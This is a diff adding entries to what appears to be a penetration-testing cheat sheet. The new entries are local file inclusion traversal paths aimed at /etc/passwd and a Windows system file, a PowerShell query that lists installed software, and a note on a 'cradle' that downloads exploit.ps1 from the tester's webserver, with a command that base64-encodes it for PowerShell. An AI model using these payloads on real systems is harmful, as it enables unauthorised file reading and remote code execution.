@@ -137,3 +137,22 @@ done
 `schtasks /query /TN taskname /XML`
 `(get-scheduledtask taskname).actions`
 `(get-scheduledtask taskname).triggers`
+
+## LFI paths
+Windows: ../../../../../windows/system32/license.rtf
+Linux: ../../../../../../etc/passwd
+
+## Windows program files path shortcuts
+c:/Progra~1 == c:/program files/
+c:/Progra~2 == c:/program files(x86)/
+
+## enum software including versions using powershell
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname; Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+
+## LibreOffice version location
+program/version.ini
+
+
+## Using a cradle.
+Cradle contains the powershell command the downloads the exploit.ps1 from your webserver.
+`cat cradle | iconv -t utf-16le |base64 -w 0`
